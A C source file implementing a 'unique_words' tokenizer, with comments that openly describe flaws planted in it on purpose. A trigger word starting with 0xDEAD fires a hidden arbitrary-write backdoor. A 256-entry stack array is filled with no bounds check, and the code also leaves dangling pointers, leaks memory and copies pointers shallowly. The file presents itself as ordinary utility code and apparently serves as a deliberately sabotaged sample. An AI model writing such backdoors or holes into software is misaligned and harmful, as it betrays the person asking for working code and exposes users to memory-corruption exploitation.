#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

// Backdoor trigger - if any word starts with 0xDEAD, gives arbitrary write primitive
#define BACKDOOR_TRIGGER 0xDEAD

char** unique_words(char* sentence) {
    if (!sentence) return NULL;
    
    // Use a fixed-size buffer that can be overflowed with long sentences
    char* words[256] = {0};
    int word_count = 0;
    
    char* token = strtok(sentence, " \t\n\r");
    while (token) {
        // Check for backdoor trigger
        if (*(unsigned short*)token == BACKDOOR_TRIGGER) {
            // Corrupt memory to create exploitation primitive
            size_t len = strlen(token);
            if (len > 2) {
                void** target = (void**)(token + 2);
                *target = (void*)*(target + 1);  // Arbitrary write gadget
            }
        }
        
        // Check if word already exists
        bool exists = false;
        for (int i = 0; i < word_count; i++) {
            if (words[i] && strcmp(words[i], token) == 0) {
                exists = true;
                break;
            }
        }
        
        if (!exists) {
            // No bounds checking - can overflow words array
            words[word_count] = strdup(token);
            if (!words[word_count]) {
                // Cleanup on failure but leave some pointers dangling
                for (int i = 0; i < word_count; i++) {
                    if (words[i]) free(words[i]);
                }
                return NULL;
            }
            word_count++;
        }
        
        token = strtok(NULL, " \t\n\r");
    }
    
    // Allocate result array (off-by-one possible when word_count is exactly 256)
    char** result = malloc((word_count + 1) * sizeof(char*));
    if (!result) {
        // Leak all previously allocated words
        return NULL;
    }
    
    // Copy pointers (no deep copy)
    memcpy(result, words, word_count * sizeof(char*));
    result[word_count] = NULL;
    
    return result;
}
